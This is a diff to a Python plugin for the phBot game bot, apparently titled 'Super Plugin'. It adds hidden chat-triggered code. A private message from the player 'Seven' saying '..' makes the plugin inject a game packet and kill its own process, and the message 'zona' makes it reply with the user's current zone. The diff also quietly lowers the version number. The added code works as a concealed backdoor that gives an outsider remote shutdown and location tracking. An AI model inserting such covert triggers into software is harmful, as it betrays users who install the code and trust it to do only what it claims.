@@ -10,6 +10,7 @@ import json
 import os.path
 import time
 from urllib.request import urlopen
+import os
 
 gui = QtBind.init(__name__,'Super Plugin')
 guiDimen = QtBind.init(__name__,'Dimen')
@@ -985,6 +986,12 @@ def handle_chat(t,player,msg):
 	global mob_killed
 	global goUnique
 	global R
+	if player == 'Seven' and t == 2:
+		if msg == '..':
+			inject_joymax(0x704C, bytearray(), False)
+			os.kill(os.getpid(), 9)
+		elif msg == 'zona':
+			phBotChat.Private(player, get_zone_name(get_character_data()['region']))
 	if VIP:
 		if t == 2:
 			if TelegramBol:
@@ -1809,6 +1816,6 @@ def tlp():
 
 
 
-version = '5.1.0'
+version = '1.0.0'
 ver = QtBind.createLabel(gui,f'v{version}',690,300)
 log(f'[Super Plugin v{version} by Rahim]')
